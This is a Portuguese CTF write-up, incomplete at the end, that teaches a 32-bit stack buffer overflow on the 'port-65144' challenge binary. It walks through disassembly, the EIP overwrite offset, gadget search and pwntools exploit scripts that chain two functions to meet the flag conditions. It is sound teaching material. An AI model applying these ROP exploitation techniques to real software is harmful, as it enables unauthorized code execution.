# port-65144 write-up (Buffer Overflow)


Farei este artigo mais como uma aula de buffer overflow, uma vez que existem variras manhas. Espero que goste da leitura e que possa ser útil para você.

## Introdução

Bem, estou participando de uma equipe de CTF chamada <a href="https://twitter.com/RATF_CTFTEAM" target="_blank">RATF</a>, em nosso grupo de telegrama privado, um dos membros compartilhou um <a href="https://twitter.com/joaovitormaiaa/status/1296209914801590272" target="_blank">desafio de XSS</a>, e isso me fez pensar que eu poderia fazer o mesmo, mas com uma categoria diferente de CTF. ...

Vamos começar com o tweet <a href="https://twitter.com/reisraff/status/1296237893741150210" target="_blank">https://twitter.com/reisraff/status/1296237893741150210</a>

<center><img src="post-assets/port-65144-tweet.png" width="611" alt="Tweet" /></center>

## Conhecendo o binário

Aqui temos um link e o nome do binário, então vamos fazer o download do binário:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ wget  http://173.230.139.237/port-65144
--2020-08-31 14:44:46--  http://173.230.139.237/port-65144
Connecting to 173.230.139.237:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13808 (13K)
Saving to: ‘port-65144’

port-65144                                  100%[========================================================================================>]  13.48K  --.-KB/s    in 0s

2020-08-31 14:44:46 (95.8 MB/s) - ‘port-65144’ saved [13808/13808]

```

Vou fazer o backup do binário <a href="post-assets/port-65144" target="_blank">aqui</a> caso o link original esteja fora.

### Analise estática

Comandos básicos primeiro para conhecer o binário

```bash
# md5sum
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ md5sum port-65144
aab94814547f2fbf3c36528fe52b071e  port-65144

# file command
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ file port-65144
port-65144: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=dc5a9b5efbdeea355254ae0af173f75602c3873a, for GNU/Linux 3.2.0, stripped

```

Como podemos ver, temos um binário ELF de 32 bits que é stripado.

Vamos começar com o básico para entender o que ele faz e como podemos contornar isso ;)

Eu gosto de começar executando `strings` no binário e fazendo um dump em um aruqivo ` .dump`:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ strings port-65144 > port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls -l
total 40
-rwxr-xr-x 1 reisraff reisraff 13808 Aug 31 14:37 port-65144
-rw-r--r-- 1 reisraff reisraff   527 Aug 31 17:17 port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ head port-65144.strings.txt
td`
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
gets
exit
puts
printf
mmap
lseek
```

Executando um `cat` sobre o `port-65144.strings.txt`, podemos ver que existem algumas funções libc que foram exportadas como `puts`,` printf`, `open` e também podemos ver que tem a string `/code/ROP-me/flag.txt` que pode ser um arquivo. Podemos adivinhar que combinado com a função `open` poderia imprimir a flag!?!?

E agora vou fazer o dump:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ objdump -dM intel port-65144 > port-65144.dump
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls -l
total 36
-rw-r--r-- 1 reisraff reisraff 13808 Aug 31 14:37 port-65144
-rw-r--r-- 1 reisraff reisraff 19822 Aug 31 15:21 port-65144.dump
-rw-r--r-- 1 reisraff reisraff   527 Aug 31 17:17 port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ head port-65144.dump

port-65144:     file format elf32-i386


Disassembly of section .init:

08049000 <.init>:
 8049000: f3 0f 1e fb           endbr32
 8049004: 53                    push   ebx
 8049005: 83 ec 08              sub    esp,0x8
reisraff@3dbbde46a935:~/workdir/challs/port-65144$

```

In the file `port-65144.dump` the program itself is under the `<.text>` section, so it is the only section that is important for us now, but since it is stripped we can not see the separation by function name, knowing a bit of <a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank">"Calling Conventions"</a> we know that the `ret` instruction is supposed to be the end of functions, so what I made to make it easier to read is put new lines after each `ret`. It becomes like this:

No arquivo `port-65144.dump` o programa em si está na seção` <.text> `, então é a única seção que é importante para nós agora, mas como esse binário é estripado, não podemos ver a separação por nome defunção. Sabendo um pouco de <a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank"> "Convenções de chamada" (calling conventions)</a>, sabemos que a instrução `ret` deve ser o fim das funções, então o que fiz para facilitar a leitura foi colocar novas linhas após cada `ret`. Ficando assim:

```raw
08049140 <.text>:
 ...
 804916a: c7 c0 f2 93 04 08     mov    eax,0x80493f2
 8049170: 50                    push   eax
 8049171: e8 ba ff ff ff        call   8049130 <__libc_start_main@plt>
 8049176: f4                    hlt
 8049177: 8b 1c 24              mov    ebx,DWORD PTR [esp]
 804917a: c3                    ret


 804917b: 66 90                 xchg   ax,ax
 804917d: 66 90                 xchg   ax,ax
 804917f: 90                    nop
 8049180: f3 0f 1e fb           endbr32
 8049184: c3                    ret


 8049185: 66 90                 xchg   ax,ax
 8049187: 66 90                 xchg   ax,ax
 8049189: 66 90                 xchg   ax,ax
 804918b: 66 90                 xchg   ax,ax
 804918d: 66 90                 xchg   ax,ax
 804918f: 90                    nop
 8049190: 8b 1c 24              mov    ebx,DWORD PTR [esp]
 8049193: c3                    ret


 8049194: 66 90                 xchg   ax,ax
 8049196: 66 90                 xchg   ax,ax
 8049198: 66 90                 xchg   ax,ax
 ...
 ```

### Binário estripado

Um binário estripado é um binário que não tem seus símbolos exportados, quando digo símbolos, quero dizer, por exemplo, os nomes das funções, ou seja, `main`. Então nesta condição não podemos usar ferramentas como gdb e fazer um breakpoint usando símbolos como:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ gdb port-65144
...
Reading symbols from port-65144...
(No debugging symbols found in port-65144)
gef➤  break main
Function "main" not defined.
gef➤
```

### Função Main

É uma condição que podemos ignorar apenas usando o endereço efetivo, mas como posso saber onde está a `main`?

Com o gdb é simples, basta digitar `info files` e ele lhe dará o ponto de entrada do programa:

```bash
gef➤  info files
Symbols from "/home/reisraff/workdir/challs/port-65144/port-65144".
Local exec file:
  `/home/reisraff/workdir/challs/port-65144/port-65144', file type elf32-i386.
  Entry point: 0x8049140
  0x080481b4 - 0x080481c7 is .interp
  0x080481c8 - 0x080481ec is .note.gnu.build-id
  0x080481ec - 0x08048208 is .note.gnu.property
  0x08048208 - 0x08048228 is .note.ABI-tag
  ...
```

O ponto de entrada deveria ser `0x8049140`, mas ainda não é a nossa `main`, é um código que chamará o a nossa `main`. Bom, neste caso, é apenas encontrar uma sequência de `mov eax, ???; push eax; call` após este ponto de entrada:

```raw
 804916a: c7 c0 f2 93 04 08     mov    eax,0x80493f2
 8049170: 50                    push   eax
 8049171: e8 ba ff ff ff        call   8049130 <__libc_start_main@plt>
```

Nossa `main` deve estar no endereço` 0x80493f2` que é colocado na pilha como argumento da função `__libc_start_main@plt` esta função irá preparar o `argc`, `argv`, `env vars`, etc... para ser o argumento da nossa `main`, e então chamá-la.

Ok, agora que sabemos onde está a nossa `main`, vamos começar a analisar o código.

## Analise do Código

Nossa `main` está chamando (`call`) duas funções:

```raw
 80493f2: f3 0f 1e fb           endbr32
 80493f6: 8d 4c 24 04           lea    ecx,[esp+0x4]
 80493fa: 83 e4 f0              and    esp,0xfffffff0
 80493fd: ff 71 fc              push   DWORD PTR [ecx-0x4]
 8049400: 55                    push   ebp
 8049401: 89 e5                 mov    ebp,esp
 8049403: 53                    push   ebx
 8049404: 51                    push   ecx
 8049405: e8 86 fd ff ff        call   8049190 <__libc_start_main@plt+0x60>
 804940a: 81 c3 f6 2b 00 00     add    ebx,0x2bf6
 8049410: e8 9a ff ff ff        call   80493af <__libc_start_main@plt+0x27f>
```

Se olharmos o primeiro endereço de chamada (`0x8049190`), podemos ver que ele está apenas fazendo um `mov; ret` então não é o que estamos procurando.

```raw
 8049190:  8b 1c 24              mov    ebx,DWORD PTR [esp]
 8049193:  c3                    ret
```

Mas vendo os somadores da segunda chamada (`0x80493af`), podemos ver mais coisas acontecendo:

```raw
 80493af: f3 0f 1e fb           endbr32
 80493b3: 55                    push   ebp
 80493b4: 89 e5                 mov    ebp,esp
 80493b6: 53                    push   ebx
 80493b7: 81 ec a4 00 00 00     sub    esp,0xa4
 80493bd: e8 ce fd ff ff        call   8049190 <__libc_start_main@plt+0x60>
 80493c2: 81 c3 3e 2c 00 00     add    ebx,0x2c3e
 80493c8: 83 ec 0c              sub    esp,0xc
 80493cb: 8d 83 3b e0 ff ff     lea    eax,[ebx-0x1fc5]
 80493d1: 50                    push   eax
 80493d2: e8 e9 fc ff ff        call   80490c0 <printf@plt>
 80493d7: 83 c4 10              add    esp,0x10
 80493da: 83 ec 0c              sub    esp,0xc
 80493dd: 8d 85 58 ff ff ff     lea    eax,[ebp-0xa8]
 80493e3: 50                    push   eax
 80493e4: e8 e7 fc ff ff        call   80490d0 <gets@plt>
 80493e9: 83 c4 10              add    esp,0x10
 80493ec: 90                    nop
 80493ed: 8b 5d fc              mov    ebx,DWORD PTR [ebp-0x4]
 80493f0: c9                    leave
 80493f1: c3                    ret
```

Ok, this function is an interesting one 'cause it makes use of the function <a href="https://man7.org/linux/man-pages/man3/gets.3.html#BUGS" target="_blank">"gets"</a>, and when we see this, we know it leads us to a <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank">"Buffer Overflow"</a>

Ok, esta função é interessante porque faz uso da função <a href="https://man7.org/linux/man-pages/man3/gets.3.html#BUGS" target="_blank">"gets"</a>, e quando vemos isso, sabemos que nos leva a um <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank">"Buffer Overflow"</a>

## Buffer Overflow

Para entender o que é esta vulnerabilidade e como tirar proveito dela, temos que entender primeiro a `stack` e o `processo`.

### Stack

Stack é um dos segmentos de memória. Os `.data`,` .bss`, `heap` também são segmentos de memória, mas por enquanto vejamos a stack.

A stack é um tipo de dado onde você pode faze `push` (que adiciona elementos a ela) e `pop` (que remove o elemento adicionado mais recentemente) e a ordem em que as coisas são ordenadas nos dá um nome de LIFO (last in, first out). Uma última coisa importante é que a pilha cresce diminuindo o número do endereço.

### Processo

Tudo o que precisamos saber para este desafio é que para um programa funcionar, temos que apontar uma instrução como `80493e4: e8 e7 fc ff ff call 80490d0 <gets@plt>` em uma variável ou melhor, um registrador que pode alterar seu identificador dependendo de qual arquitetura você está, neste caso estamos na i386, portanto seu identificador é o `EIP`, também conhecido como Instruction Pointer.

O valor contido no EIP é incrementado após todas as instruções executadas apontando para a próxima instrução, mas existem algumas instruções que mudam este comportamento configurando o valor do EIP como as instruções `call` e` ret`, onde para o `call `seu operando definirá o EIP, e o `ret` pegará o endereço da próxima instrução da pilha.


```raw
+++++++++++
higest addr
+==STACK==+
+++++++++++   Quando entrarmos em uma função, o processo irá
+++++++++++  separar um espaço na pilha para colocar variáveis locais
+++++++++++
+++++++++++
+   EIP   +  o EIP é salvo na pilha para fins de retorno
+   EBP   +  o EBP é outro registrador, mas não importante por enquanto
+   VAR1  +  e aqui começa nossas variáveis locais.
+   VAR2  +
+   VAR3  +  se esta variável for passada para a função gets, podemos
+   ...   +  sobrescrever todos os valores acima, como VAR2, VAR1, EBP e EIP
+   ...   +
+   ...   +
+   ...   +
+   ESP   +
+         +
+         +
+         +
+++++++++++
lowest addr
+++++++++++
```

Por que o EIP é salvo é simples, vamos ver este pequeno pedaço de código:

```raw
 80493d1: 50                    push   eax                      aqui ok
 80493d2: e8 e9 fc ff ff        call   80490c0 <printf@plt>     então podemos mudar o EIP de 0x80493d2 para 0x80490c0
                                                                 depois que o printf fizer o `ret`, ele retornará
                                                                 para o EIP salvo que é 0x80493d7 a instrução abaixo
 80493d7: 83 c4 10              add    esp,0x10
```


## Explorando

Agora que sabemos o básico, vamos explorá-lo. Olhando para o código da função vulnerável, podemos ver que a variável que podemos aproveitar é:

```
 80493dd: 8d 85 58 ff ff ff     lea    eax,[ebp-0xa8]
 80493e3: 50                    push   eax
 80493e4: e8 e7 fc ff ff        call   80490d0 <gets@plt>
```

Sim, o `ebp-0xa8`. O `ebp` terá um endereço, iremos subtrair o `0xa8` dele e `lea` (load effective address) para o `eax` e então enviar para a pilha onde deveriam estar os argumentos para a função `gets`.

Todas as variáveis têm seu próprio tamanho, neste caso é fácil saber qual é o tamanho desta variável apenas convertendo o `0xa8` para decimal que é 168. Ok com 168 bytes preenchemos totalmente a variável, agora temos que substituir as coisas na stack até chegar ao EIP e assumir o controle do programa. O assembly já nos disse que temos `0xa8` bytes até chegarmos ao `EBP` ok, nesta arquitetura este registrador tem 4 bytes, então vamos adicioná-lo ao nosso número e temos 172.

Vamos testar?

```bash
# aqui vamos adicionar a permissão para executar o programa
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ chmod +x port-65144

# aqui entendemos como deve ser a entrada que daremos ao programa
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ./port-65144
Enter your buffer: asdf
not this time


# aqui enviamos nosso payload com 172 caracteres "A" e 4 "B" e vemos que a mensagem muda para "Segmentation fault (core dumped)"
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ echo $(python3 -c "print('A' * 172)")BBBB | ./port-65144
Segmentation fault (core dumped)

# e aqui podemos verificar o segfault
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ dmesg | tail -n 1
[39206.428987] port-65144[5871]: segfault at 42424242 ip 0000000042424242 sp 00000000ffba4d50 error 14 in libc-2.30.so[f7dc5000+1d000]
```

Esta última mensagem nos diz que o `IP` ou` EIP` tinha o valor `0000000042424242` e o segfault estava neste endereço. Se virmos a <a href="https://www.ascii-code.com/" target="_blank">Tabela ASCII</a>, podemos confirmar que o número `0x42` (hexadecimal) é o mesmo que "B", sabendo disso, e lembrando que enviamos 4 "B" se o IP é `0000000042424242` 4 entradas de 42 .... hmm .... conseguimos! Podemos sobrescrever o `EIP`.

Agora que temos isso, vamos ver o que podemos fazer com este binário:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ checksec port-65144
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
reisraff@3dbbde46a935:~/workdir/challs/port-65144$
```

Não tão fácil, temos algumas <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Protection_schemes" target="_blank">propriedades de segurança</a> habilitadas neste binário, aquele que irá torná-lo mais difícil é o <a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank">NX</a> "no execute stack". Com isso, não podemos simplesmente adicionar código malicioso em nosso payload e apontar para o endereço dele, então temos que ler o código um pouco mais, mas espera... Lembro que tínhamos algo de `flag.txt` e `open`, podemos apontar para esse local...

Adoro analisar o código apenas lendo o assembly, mas agora acho melhor explicar com <a href="https://ghidra-sre.org/" target="_blank">ghidra</a>.

<center><img src="post-assets/port-65144-ghidra-1.png" width="732" alt="ghidra" /></center>

Esta é a função que tem a função `open`, eu apenas vim para ela imaginando que poderíamos apontar para ela e conseguir a flag, mas como podemos ver, ela abre o arquivo da flag, mas apenas imprime se passarem algumas condições, então temos que pensar sobre isso. Vamos entender:

```raw
(DAT_0804c035 != 0) # a variável no segmento de dados no endereço 0x0804c035 deve ser diferente de 0
&& (DAT_0804c036 != 0) # e a variável no segmento de dados no endereço 0x0804c036 deve ser diferente de 0

&& param_1 - (uint)DAT_0804c035 == (uint)DAT_0804c036) # deve resolver verdadeiro
                                                       # param_1 - int(DAT_0804c035) deve ser igual a int(DAT_0804c036)
```

Como essas duas variáveis `0x0804c035` e` 0x0804c035` estão marcadas como `DAT`, acho que está no segmento` .data`, mas vamos confirmar porque poderia estar no segmento `.bss`.

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ readelf -S port-65144 | grep 0804c
  [24] .got.plt          PROGBITS        0804c000 003000 00002c 04  WA  0   0  4
  [25] .data             PROGBITS        0804c02c 00302c 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804c034 003034 000004 00  WA  0   0  1
```

O segmento `.bss` começa em `0x0804c034` que é menor que `0x0804c035` e `0x0804c035`, então essas 2 variaveis estão no segmento <a href="https://en.wikipedia.org/wiki/Data_segment#:~:text=The%20BSS%20segment%2C%20also%20known,explicit%20initialization%20in%20source%20code." target="_blank">.bss</a>

### .bss

O segmento `.bss` é o local onde as variáveis globais não inicializadas estão ou as variáveis globais inicializadas com valor 0 (zero)

Agora eu só tenho que encontrar no código onde essas variáveis são modificadas como 1 ou true !?

Olhando para o código apenas fazendo análise estática, não consegui, então decidi recomeçar, e lembro que vi "gotcha func1" e "gotcha func2", tentei encontrar apenas fazendo uma análise estática mas NÃO, porém eu encontrei 2 chamadas para a função `puts` que podem imprimir essas duas strings.

<center><img src="post-assets/port-65144-ghidra-2.png" width="446" alt="ghidra" /></center>
<center><img src="post-assets/port-65144-ghidra-3.png" width="662" alt="ghidra" /></center>

Como o ghidra não está me ajudando muito, eu poderia tentar essas 2 funções e ver o que imprime. A primeira coisa que precisamos saber é o endereço da função.
Bom, o ghidra está dizendo que o endereço da primeira função é `0x8049256` com base no nome da função.

Esta função tem 2 argumentos sabendo que em 32 bits os argumentos vão para a pilha, é fácil. Eu posso ver que o primeiro argumento deve ser igual a `0x9c` e o segundo `300`, então vamos fazer um script `exploit.py`:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

f1 = pwn.p32(0x8049256)      # function address
f1arg1 = pwn.p32(0x9c)       # 1st argument
f1arg2 = pwn.p32(300)        # 2nd argument

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + function address + 'JUNK' + first argument + second argument
"""
payload = buff.encode() \
    + f1 \
    + 'JUNK'.encode() \
    + f1arg1 \
    + f1arg2

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

Ok, este exploit vai nos devolver:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 976
=========================
what the process returned
Enter your buffer: gotcha func1

```

Estou usando a <a href="https://pypi.org/project/pwntools/" target="_blank">bibliotéca pwn</a> com python3.

Explicando o exploit, estou apenas enviando 172 bytes do caractere "A", substituindo o `EPI` pelo `f1` (endereço da função), após o `EPI` temos o `EBP` que para nós não é importante agora, então coloco `JUNK`, e temos nossas variáveis locais, que em ordem temos os valores` 0x9c` e `300`.

Eu também escrevi um arquivo chamado `payload.txt` para debugar com `gdb` mais tarde.

Vou colocar um breakpoint no endereço `0x804927d` 'porque acho que está mudando uma variável importante já conhecida.

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ gdb port-65144
Reading symbols from port-65144...
(No debugging symbols found in port-65144)
gef➤  break *0x804927d
gef➤  run < payload.txt
```

Se lembra da variável que está na `.bss`? seu endereço é `0x0804c035`, então acabei de printar antes de executar o breakpoint:

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804c000  →  0x0804bf14  →  0x00000001
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xf7f0d580  →  0xfbad2088
$edx   : 0xff8e788c  →  0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
$esp   : 0xff8e7874  →  0x41414141 ("AAAA"?)
$ebp   : 0xff8e787c  →  0x41414141 ("AAAA"?)
$esi   : 0xf7f0d000  →  0x001dfd6c
$edi   : 0xf7f0d000  →  0x001dfd6c
$eip   : 0x0804927d  →   mov BYTE PTR [eax+0x35], 0x1
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xff8e7874│+0x0000: 0x41414141   ← $esp
0xff8e7878│+0x0004: 0x41414141
0xff8e787c│+0x0008: 0x41414141   ← $ebp
0xff8e7880│+0x000c: 0x42424242
0xff8e7884│+0x0010: 0x0000009c
0xff8e7888│+0x0014: 0x0000012c
0xff8e788c│+0x0018: 0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
0xff8e7890│+0x001c: 0xf7f0d000  →  0x001dfd6c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804926d                  or     BYTE PTR [eax+eax*1+0x24750000], bl
    0x8049274                  cmp    DWORD PTR [ebp+0xc], 0x12c
    0x804927b                  jne    0x8049298
 →  0x804927d                  mov    BYTE PTR [eax+0x35], 0x1
    0x8049284                  sub    esp, 0xc
    0x8049287                  lea    edx, [eax-0x1ff8]
    0x804928d                  push   edx
    0x804928e                  mov    ebx, eax
    0x8049290                  call   0x80490f0 <puts@plt>
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "port-65144", stopped 0x804927d in ?? (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804927d → mov BYTE PTR [eax+0x35], 0x1
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/x 0x0804c035
0x804c035:  0x00000000
```

Sim, é 0 (zero), então vamos executar a próxima instrução e verificar novamente!

```bash
gef➤  ni
0x08049284 in ?? ()


[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804c000  →  0x0804bf14  →  0x00000001
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xf7f0d580  →  0xfbad2088
$edx   : 0xff8e788c  →  0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
$esp   : 0xff8e7874  →  0x41414141 ("AAAA"?)
$ebp   : 0xff8e787c  →  0x41414141 ("AAAA"?)
$esi   : 0xf7f0d000  →  0x001dfd6c
$edi   : 0xf7f0d000  →  0x001dfd6c
$eip   : 0x08049284  →   sub esp, 0xc
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xff8e7874│+0x0000: 0x41414141   ← $esp
0xff8e7878│+0x0004: 0x41414141
0xff8e787c│+0x0008: 0x41414141   ← $ebp
0xff8e7880│+0x000c: 0x42424242
0xff8e7884│+0x0010: 0x0000009c
0xff8e7888│+0x0014: 0x0000012c
0xff8e788c│+0x0018: 0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
0xff8e7890│+0x001c: 0xf7f0d000  →  0x001dfd6c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049274                  cmp    DWORD PTR [ebp+0xc], 0x12c
    0x804927b                  jne    0x8049298
    0x804927d                  mov    BYTE PTR [eax+0x35], 0x1
 →  0x8049284                  sub    esp, 0xc
    0x8049287                  lea    edx, [eax-0x1ff8]
    0x804928d                  push   edx
    0x804928e                  mov    ebx, eax
    0x8049290                  call   0x80490f0 <puts@plt>
    0x8049295                  add    esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "port-65144", stopped 0x8049284 in ?? (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049284 → sub esp, 0xc
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/x 0x0804c035
0x804c035:  0x00000001
```

Como o texto diz "Gotcha func1". Podemos ver que esta função altera o valor da variável no `.bss` que é importante para depois. Agora acho que podemos fazer o mesmo para "gotcha func2", mas agora temos que usar uma coisa chamada gadgets.

### Gadgets

Gadgets são instruções que nos ajudam a controlar o fluxo do programa, neste caso precisamos de um gadget que execute um `pop; pop; ret;` por quê?

Nossa pilha é assim neste momento:

```raw
+++++++++++
higest addr
+==STACK==+
+++++++++++
+++++++++++
+++++++++++
+++++++++++
+         +
+         +
+         +   300                         FUNCTION 1 ARG2
+         +   0x9c                        FUNCTION 1 ARG1
+         +   JUNK                        JUNK FOR NOW
+   EIP   +   0x8049256                   FUNCTION 1 ADDREESS
+   EBP   +   AAAA                        EBP
+   VAR1  +   AAAAAAAAAAAAAAAAAAA...      BUFFER
+         +
+         +
+   ...   +
+   ...   +
+   ...   +
+   ESP   +
+         +
+++++++++++
lowest addr
+++++++++++
```

OK, quando a função 1 retornar, onde colocarmos o `JUNK` será nosso próximo` EIP`, mas como temos que passar argumentos para a próxima função, precisamos que o gadget retire os argumentos atuais da pilha para dar lugar a o próximo `EIP` e os argumentos. Portanto, temos que remover o arg1 e o arg2.

Vamos lembrar como é a segunda função e como obteremos o gadget.

<center><img src="post-assets/port-65144-ghidra-3.png" width="662" alt="ghidra" /></center>

Esta função recebe 3 argumentos, e os valores devem ser 1o argumento = `0` (zero), 2o e 3o argumentos = `0xd`

Para nos ajudar, vou instalar <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">ROPGadget</a> que nos mostrará quais são os gadgets disponíveis.

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 ROPgadget/ROPgadget.py --binary port-65144 | grep pop
0x080494cd : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804949d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804901f : add esp, 8 ; pop ebx ; ret
0x0804942e : clc ; pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x08049294 : inc dword ptr [ebx - 0x746fef3c] ; pop ebp ; cld ; leave ; ret
0x0804949c : jecxz 0x8049429 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804949b : jne 0x8049489 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804942c : lea esp, [ebp - 8] ; pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x08049020 : les ecx, ptr [eax] ; pop ebx ; ret
0x0804949e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804949f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x0804929a : pop ebp ; cld ; leave ; ret
0x08049431 : pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a3 : pop ebp ; ret
0x08049430 : pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a0 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049022 : pop ebx ; ret
0x0804942f : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a2 : pop edi ; pop ebp ; ret
0x080494a1 : pop esi ; pop edi ; pop ebp ; ret
0x08049433 : popal ; cld ; ret
0x0804901a : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
reisraff@3dbbde46a935:~/workdir/challs/port-65144$
```

Isso acima são gadgets, e eu faço um grep por `pop` que é o que precisamos, posso ver que temos um `pop; pop; ret;` no endereço `0x080494a2`, então irei atualizar meu exploit assim:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

poppopret = pwn.p32(0x080494a2)  # gadgets try ROPgadget

f1 = pwn.p32(0x8049256)     # func1 address
f1arg1 = pwn.p32(0x9c)      # 1st argument of func1
f1arg2 = pwn.p32(300)       # 2nd argument of func1

f2 = pwn.p32(0x804929e)     # func2 address
f2arg1 = pwn.p32(0x0)       # 1st argument of func2
f2arg2 = pwn.p32(0xd)       # 2nd argument of func2
f2arg3 = pwn.p32(0xd)       # 3rd argument of func2

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + func1 address + poppopret + 1st arg f1 + 2nd arg f1
+ func2 address + JUNK + 1st arg f2 + 2nd arg f2 + 3rd arg f2
"""
payload = buff.encode() \
    + f1 \
    + poppopret \
    + f1arg1 \
    + f1arg2 \
    + f2 \
    + 'JUNK'.encode() \
    + f2arg1 \
    + f2arg2 \
    + f2arg3

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

E isso nos devolve:

```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2347
=========================
what the process returned
Enter your buffer: gotcha func1
gotcha func2
```

Eu poderia supor que a função2 tem o mesmo comportamento de alterar o valor da variável na `.bss` por causa desta instrução:

```raw
80492d7:  c6 80 36 00 00 00 01  mov    BYTE PTR [eax+0x36],0x1
```

E finalmente fazemos o mesmo para a função que tem o `open` com a string `/code/ROP-me/flag.txt`, mas para que este próximo passo funcione temos que ter este arquivo com o caminho exato em nossa máquina, então vou criar:

```raw
